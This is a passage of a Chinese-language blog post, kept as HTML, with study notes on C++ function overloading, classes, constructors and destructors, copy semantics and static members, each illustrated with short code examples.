class="comment">//函数参数类型相同，顺序不同</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func (double a ,int b)的调用！&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div></li>
</ul>
<blockquote>
<p><strong>注意:</strong>  函数的返回值不可以作为函数重载的条件</p>
</blockquote>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">double</span> a ,<span class="type">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func (double a ,int b)的调用！&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//函数返回值不可以作为函数重载条件</span></span><br><span class="line"><span class="comment">//下面的函数返回值为int，上面返回void，但不能重载</span></span><br><span class="line"><span class="comment">//int func(double a, int b)</span></span><br><span class="line"><span class="comment">//&#123;</span></span><br><span class="line"><span class="comment">//	cout &lt;&lt; &quot;func (double a ,int b)的调用！&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>当函数重载碰到函数默认参数，会产生歧义，尽量避免发生</p>
</blockquote>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数重载碰到函数默认参数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func2</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b = <span class="number">10</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func2(int a, int b = 10) 调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func2</span><span class="params">(<span class="type">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func2(int a) 调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//func2(10); //碰到默认参数产生歧义，需要避免</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E6%A0%B8%E5%BF%83%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/image-20241023174249965.png"
                      alt="image-20241023174249965"
                ></p>
<h2 id="4-类与对象"><a href="#4-类与对象" class="headerlink" title="4 类与对象*"></a>4 类与对象*</h2><h3 id="4-1-类的封装"><a href="#4-1-类的封装" class="headerlink" title="4.1 类的封装"></a>4.1 类的封装</h3><h4 id="4-1-1-封装的概念"><a href="#4-1-1-封装的概念" class="headerlink" title="4.1.1 封装的概念"></a>4.1.1 封装的概念</h4><p>封装的意义：</p>
<ul>
<li>将属性和行为作为一个整体，表现生活中的事物</li>
<li>将属性和行为加以权限控制</li>
</ul>
<h4 id="4-1-2-类封装的表现形式"><a href="#4-1-2-类封装的表现形式" class="headerlink" title="4.1.2 类封装的表现形式"></a>4.1.2 类封装的表现形式</h4><p><strong>类关键词：</strong><code>class</code></p>
<p><strong>封装语法：</strong> <code>class 类名&#123;   访问权限： 属性  / 行为  &#125;;</code></p>
<p><strong>属性：</strong>即类中的变量</p>
<p><strong>行为（方法）：</strong>即类中的函数</p>
<h4 id="4-1-3-封装中属性和行为的权限"><a href="#4-1-3-封装中属性和行为的权限" class="headerlink" title="4.1.3 封装中属性和行为的权限"></a>4.1.3 封装中属性和行为的权限</h4><ol>
<li>public        公共权限 —— 类内可以访问  类外可以访问</li>
<li>protected 保护权限 —— 类内可以访问  类外不可以访问（继承的可以访问）</li>
<li>private      私有权限 —— 类内可以访问  类外不可以访问（仅自己或者友元可以访问）</li>
</ol>
<blockquote>
<p>public中的函数可以调用并修改private中的成员属性</p>
</blockquote>
<h4 id="4-1-4-类与结构体的区别"><a href="#4-1-4-类与结构体的区别" class="headerlink" title="4.1.4 类与结构体的区别"></a>4.1.4 类与结构体的区别</h4><p>在C++中 struct和class唯一的<strong>区别</strong>就在于 <strong>默认的访问权限不同</strong></p>
<p>区别：</p>
<ul>
<li>struct 默认权限为公共</li>
<li>class   默认权限为私有</li>
</ul>
<h3 id="4-2-类的组成"><a href="#4-2-类的组成" class="headerlink" title="4.2 类的组成"></a>4.2 类的组成</h3><blockquote>
<p>即对象初始化</p>
</blockquote>
<h4 id="4-2-1-构造函数与析构函数"><a href="#4-2-1-构造函数与析构函数" class="headerlink" title="4.2.1 构造函数与析构函数*"></a>4.2.1 构造函数与析构函数*</h4><blockquote>
<p>与php中的类似</p>
</blockquote>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E6%A0%B8%E5%BF%83%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/image-20241024014451448.png"
                      alt="image-20241024014451448"
                ></p>
<ul>
<li>构造函数：主要作用在于创建对象时为对象的成员属性赋值，构造函数由编译器自动调用，无须手动调用。</li>
<li>析构函数：主要作用在于对象<strong>销毁前</strong>系统自动调用，执行一些清理工作。</li>
</ul>
<p>当不主动提供构造和析构时，编译器会提供，但<strong>编译器提供的构造函数和析构函数是空实现即不返回任何指令。</strong></p>

  <div class="note p-4 mb-4 rounded-small warning">
    <p>一般是先在对象初始化之前执行构造函数，在执行后随着当前栈一起释放后执行析构函数</p>

  </div>

<h5 id="函数语法"><a href="#函数语法" class="headerlink" title="函数语法"></a>函数语法</h5><p><strong>构造函数语法：</strong><code>类名()&#123;&#125;</code></p>
<ol>
<li>构造函数，没有返回值也不写void</li>
<li>函数名称与类名相同</li>
<li>构造函数可以有参数，因此可以发生重载</li>
<li>程序在调用对象时候会自动调用构造，无须手动调用,而且只会调用一次</li>
</ol>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//构造函数</span></span><br><span class="line">	<span class="built_in">Person</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Person的构造函数调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p><strong>析构函数语法：</strong> <code>~类名()&#123;&#125;</code></p>
<ol>
<li>析构函数，没有返回值也不写void</li>
<li>函数名称与类名相同,在名称前加上符号  ~</li>
<li>析构函数不可以有参数，因此不可以发生重载</li>
<li>程序在对象销毁前会自动调用析构，无须手动调用,而且只会调用一次</li>
</ol>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//析构函数</span></span><br><span class="line">	~<span class="built_in">Person</span>()</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;Person的析构函数调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<h4 id="4-2-2-构造函数"><a href="#4-2-2-构造函数" class="headerlink" title="4.2.2 构造函数"></a>4.2.2 构造函数</h4><p><strong>分类方式：</strong></p>
<p>​	按<strong>参数</strong>分为： 有参构造和无参构造</p>
<p>​	按<strong>类型</strong>分为： 普通构造和拷贝构造</p>
<p><strong>调用方式：</strong></p>
<p>​	括号法</p>
<p>​	显示法</p>
<p>​	隐式转换法</p>

  <div class="note p-4 mb-4 rounded-small info">
    <p>这里最好看实例，光看文字可能不好懂</p>

  </div>

<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1、构造函数分类</span></span><br><span class="line"><span class="comment">// 按照参数分类分为 有参和无参构造   无参又称为默认构造函数</span></span><br><span class="line"><span class="comment">// 按照类型分类分为 普通构造和拷贝构造</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="comment">//无参（默认）构造函数</span></span><br><span class="line">	<span class="built_in">Person</span>() &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;无参构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//有参构造函数</span></span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">int</span> a) &#123;</span><br><span class="line">		age = a;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;有参构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//拷贝构造函数</span></span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">const</span> Person&amp; p) &#123;</span><br><span class="line">		age = p.age;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;拷贝构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//析构函数</span></span><br><span class="line">	~<span class="built_in">Person</span>() &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;析构函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> age;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">//2、构造函数的调用</span></span><br><span class="line"><span class="comment">//调用无参构造函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	Person p; <span class="comment">//调用无参构造函数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用有参的构造函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2.1  括号法，常用</span></span><br><span class="line">	<span class="function">Person <span class="title">p1</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line">	<span class="comment">//注意1：调用无参构造函数不能加括号，如果加了编译器认为这是一个函数声明</span></span><br><span class="line">	<span class="comment">//Person p2();</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//2.2 显式法</span></span><br><span class="line">	Person p2 = <span class="built_in">Person</span>(<span class="number">10</span>); </span><br><span class="line">	Person p3 = <span class="built_in">Person</span>(p2);</span><br><span class="line">	<span class="comment">//Person(10)单独写就是匿名对象  当前行结束之后，马上析构</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//2.3 隐式转换法</span></span><br><span class="line">	Person p4 = <span class="number">10</span>; <span class="comment">// Person p4 = Person(10); </span></span><br><span class="line">	Person p5 = p4; <span class="comment">// Person p5 = Person(p4); </span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//注意2：不能利用 拷贝构造函数 初始化匿名对象 编译器认为是对象声明</span></span><br><span class="line">	<span class="comment">//Person p5(p4);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line">	<span class="comment">//test02();</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h5 id="4-2-2-1-拷贝构造函数"><a href="#4-2-2-1-拷贝构造函数" class="headerlink" title="4.2.2.1 拷贝构造函数"></a>4.2.2.1 拷贝构造函数</h5><h6 id="4-2-2-1-1-概念"><a href="#4-2-2-1-1-概念" class="headerlink" title="4.2.2.1.1 概念"></a>4.2.2.1.1 概念</h6><div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Person</span>(<span class="type">const</span> Person&amp; p) &#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;拷贝构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>拷贝构造需要在原对象的基础上进行拷贝，则需要<code>const</code>使原对象不发生变化，而为了不反复使系统调用临时变量（其中又会调用一次对象，而对象里面又有拷贝构造函数会造成无限递归）复制传入的实参，又需要使用<code>引用&amp;</code>来进行限制</p>
<h6 id="4-2-2-1-2-调用时机"><a href="#4-2-2-1-2-调用时机" class="headerlink" title="4.2.2.1.2 调用时机"></a>4.2.2.1.2 调用时机</h6><p>C++中拷贝构造函数调用时机通常有三种情况</p>
<p>示例类创建：</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>() &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;无参构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">		mAge = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">int</span> age) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;有参构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">		mAge = age;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">Person</span>(<span class="type">const</span> Person&amp; p) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;拷贝构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">		mAge = p.mAge;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//析构函数在释放内存之前调用</span></span><br><span class="line">	~<span class="built_in">Person</span>() &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;析构函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">int</span> mAge;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<ul>
<li><p>使用一个已经创建完毕的对象来初始化一个新对象</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1. 使用一个已经创建完毕的对象来初始化一个新对象</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="function">Person <span class="title">man</span><span class="params">(<span class="number">100</span>)</span></span>; <span class="comment">//man对象已经创建完毕</span></span><br><span class="line">	<span class="function">Person <span class="title">newman</span><span class="params">(man)</span></span>; <span class="comment">//调用拷贝构造函数</span></span><br><span class="line">	Person newman2 = man; <span class="comment">//拷贝构造</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//Person newman3;</span></span><br><span class="line">	<span class="comment">//newman3 = man; //不是调用拷贝构造函数，赋值操作</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>值传递的方式给函数参数传值</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//2. 值传递的方式给函数参数传值</span></span><br><span class="line"><span class="comment">//相当于隐式转换Person p1 = p;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">doWork</span><span class="params">(Person p1)</span> </span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test02</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	Person p; <span class="comment">//无参构造函数</span></span><br><span class="line">	<span class="built_in">doWork</span>(p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>以值方式返回局部对象</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//3. 以值方式返回局部对象</span></span><br><span class="line"><span class="function">Person <span class="title">doWork2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Person p1;</span><br><span class="line">	cout &lt;&lt; (<span class="type">int</span> *)&amp;p1 &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">return</span> p1;<span class="comment">//根据局部对象p1，调用新的内存拷贝p1并返回</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test03</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Person p = <span class="built_in">doWork2</span>();</span><br><span class="line">    <span class="comment">//返回新的p1对象并传给p，会先执行拷贝函数，当函数结束再执行析构函数</span></span><br><span class="line">	cout &lt;&lt; (<span class="type">int</span> *)&amp;p &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
</ul>
<h6 id="4-2-2-1-3-浅拷贝与深拷贝"><a href="#4-2-2-1-3-浅拷贝与深拷贝" class="headerlink" title="4.2.2.1.3 浅拷贝与深拷贝*"></a>4.2.2.1.3 浅拷贝与深拷贝*</h6><p><strong>浅拷贝：</strong>简单的赋值拷贝操作（系统默认浅拷贝）</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Person</span>(<span class="type">const</span> Person&amp; p) &#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;拷贝构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	m_age = p.m_age;</span><br><span class="line">	m_height = p.m_height;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>深拷贝：</strong>在堆区重新申请空间，进行拷贝操作</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Person</span>(<span class="type">const</span> Person&amp; p) &#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;拷贝构造函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	m_age = p.m_age;</span><br><span class="line">	m_height = <span class="keyword">new</span> <span class="built_in">int</span>(*p.m_height);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>区别</strong></p>
<p>当出现在堆区有成员属性时，浅拷贝会导致多次调用同一个一模一样的堆的地址，当堆被释放使就会报错，而深拷贝则会将所有的都进行新的空间开辟，不会影响原数据</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//析构函数</span></span><br><span class="line">~<span class="built_in">Person</span>() &#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;析构函数!&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">if</span> (m_height != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">delete</span> m_height;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E6%A0%B8%E5%BF%83%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/image-20241024020916279.png"
                      alt="image-20241024020916279"
                ></p>
<blockquote>
<p>总结：如果属性有在堆区开辟的，一定要自己提供拷贝构造函数，防止浅拷贝带来的问题</p>
</blockquote>
<h5 id="4-2-2-2-构造函数调用规则"><a href="#4-2-2-2-构造函数调用规则" class="headerlink" title="4.2.2.2 构造函数调用规则"></a>4.2.2.2 构造函数调用规则</h5><p>构造函数调用规则如下：</p>
<ul>
<li><p>如果用户定义有参构造函数，c++不再提供默认无参构造，但是会提供默认拷贝构造</p>
</li>
<li><p>如果用户定义拷贝构造函数，c++不会再提供其他构造函数</p>
</li>
</ul>
<blockquote>
<p>即：无参&lt;有参&lt;拷贝</p>
</blockquote>
<p>有拷贝不提供无参与有参，有有参不提供无参提供浅拷贝，有无参默认提供空的有参和浅拷贝</p>
<h5 id="4-2-2-3-初始化列表"><a href="#4-2-2-3-初始化列表" class="headerlink" title="4.2.2.3 初始化列表"></a>4.2.2.3 初始化列表</h5><p><strong>概念：</strong>利用传入值，进行多次的类属性初始化</p>
<p><strong>语法：</strong><code>构造函数(值1，值2)：属性1(值1),属性2（值2）... &#123;&#125;</code></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">////传统方式初始化</span></span><br><span class="line"><span class="comment">//Person(int a, int b, int c) &#123;</span></span><br><span class="line"><span class="comment">//	m_A = a;</span></span><br><span class="line"><span class="comment">//	m_B = b;</span></span><br><span class="line"><span class="comment">//	m_C = c;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//初始化列表方式初始化</span></span><br><span class="line"><span class="built_in">Person</span>(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c) :<span class="built_in">m_A</span>(a), <span class="built_in">m_B</span>(b), <span class="built_in">m_C</span>(c) &#123;&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>调用传入参数：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">Person <span class="title">p</span><span class="params">(<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span></span>;</span><br></pre></td></tr></table></figure></div>

<h4 id="4-2-3-类成员"><a href="#4-2-3-类成员" class="headerlink" title="4.2.3 类成员"></a>4.2.3 类成员</h4><h5 id="4-2-3-1-类对象作为类成员"><a href="#4-2-3-1-类对象作为类成员" class="headerlink" title="4.2.3.1 类对象作为类成员"></a>4.2.3.1 类对象作为类成员</h5><p>C++类中的成员可以是另一个类的对象，我们称该成员为 对象成员</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">A</span> &#123;&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span></span><br><span class="line">&#123;</span><br><span class="line">    A a；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>函数调用顺序</strong>（此与下面[继承时的调用顺序](#4.5.4.1 构造和析构顺序)一样）</p>
<p><strong>构造函数：</strong>先调用对象成员的构造，再调用本类构造</p>
<p><strong>析构函数：</strong>先调用本类的析构，再调用对象成员的析构</p>
<blockquote>
<p>总结：先有对象成员所以先调用对象成员构造，销毁时先销毁本类调用本类的析构，而对象成员不一定立刻就被销毁，所以后调用析构</p>
</blockquote>
<h5 id="4-2-3-2-静态成员"><a href="#4-2-3-2-静态成员" class="headerlink" title="4.2.3.2 静态成员"></a>4.2.3.2 静态成员</h5><h6 id="4-2-3-2-1-概念"><a href="#4-2-3-2-1-概念" class="headerlink" title="4.2.3.2.1 概念"></a>4.2.3.2.1 概念</h6><p>静态成员就是在成员变量和成员函数前加上<code>关键字static</code>，称为静态成员</p>
<h6 id="4-2-3-2-2-分类"><a href="#4-2-3-2-2-分类" class="headerlink" title="4.2.3.2.2 分类"></a>4.2.3.2.2 分类</h6><p>静态成员分为：</p>
<ul>
<li><p>静态成员变量</p>
<ul>
<li><p>所有对象共享同一份数据</p>
</li>
<li><p>在编译阶段分配内存</p>
</li>
<li><p><strong>类内声明，类外初始化</strong></p>
<p><code>值类型 类名::静态成员变量=值</code></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> m_A; <span class="comment">//静态成员变量，类内声明</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> m_B; <span class="comment">//静态成员变量也是分访问权限的</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> Person::m_A = <span class="number">10</span>;<span class="comment">//类外初始化</span></span><br><span class="line"><span class="type">int</span> Person::m_B = <span class="number">10</span>;<span class="comment">//类外初始化</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li><p>静态成员函数</p>
<ul>
<li><p>所有对象共享同一个函数</p>
</li>
<li><p><strong>静态成员函数只能访问静态成员变量</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;func调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">		m_A = <span class="number">100</span>;</span><br><span class="line">		<span class="comment">//m_B = 100; //错误，不可以访问非静态成员变量</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> m_A; <span class="comment">//静态成员变量</span></span><br><span class="line">	<span class="type">int</span> m_B; <span class="comment">//</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="comment">//静态成员函数也是分访问权限的</span></span><br><span class="line">	<span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">func2</span><span class="params">()</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;func2调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> Person::m_A = <span class="number">10</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
</ul>
<p>访问方式：</p>
<ul>
<li><p>静态成员变量</p>
<ul>
<li><p>1、通过对象</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">Person p1;</span><br><span class="line">p<span class="number">1.</span>m_A = <span class="number">100</span>;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;p1.m_A = &quot;</span> &lt;&lt; p<span class="number">1.</span>m_A &lt;&lt; endl;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>2、通过类名</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">cout &lt;&lt; <span class="string">&quot;m_A = &quot;</span> &lt;&lt; Person::m_A &lt;&lt; endl;</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
<li><p>静态成员函数</p>
<ul>
<li><p>1、通过对象</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">Person p1;</span><br><span class="line">p<span class="number">1.f</span>unc();</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>2、通过类名</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line">Person::<span class="built_in">func</span>();</span><br></pre></td></tr></table></figure></div></li>
</ul>
</li>
</ul>
<blockquote>
<p> 总结：所有static的都是共享内存，静态只能访问静态</p>
</blockquote>
<h5 id="4-2-3-3-类成员变量与成员函数"><a href="#4-2-3-3-类成员变量与成员函数" class="headerlink" title="4.2.3.3 类成员变量与成员函数"></a>4.2.3.3 类成员变量与成员函数</h5><h6 id="4-2-3-3-1-存储方式"><a href="#4-2-3-3-1-存储方式" class="headerlink" title="4.2.3.3.1 存储方式"></a>4.2.3.3.1 存储方式</h6><p>在C++中，类内的成员变量和成员函数分开存储</p>
<p><strong>只有非静态成员变量才属于类的对象上</strong></p>
<ul>
<li>静态成员变量与静态成员函数不占对象空间，占用全局空间</li>
<li>类函数不占对象空间，所有函数共享一个函数实例</li>
<li>非静态成员变量占对象空间</li>
</ul>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>() &#123;</span><br><span class="line">		mA = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//非静态成员变量占对象空间</span></span><br><span class="line">	<span class="type">int</span> mA;</span><br><span class="line">	<span class="comment">//静态成员变量不占对象空间，占用全局空间</span></span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> mB; </span><br><span class="line">	<span class="comment">//函数也不占对象空间，所有函数共享一个函数实例</span></span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;mA:&quot;</span> &lt;&lt; <span class="keyword">this</span>-&gt;mA &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//静态成员函数也不占对象空间</span></span><br><span class="line">	<span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">sfunc</span><span class="params">()</span> 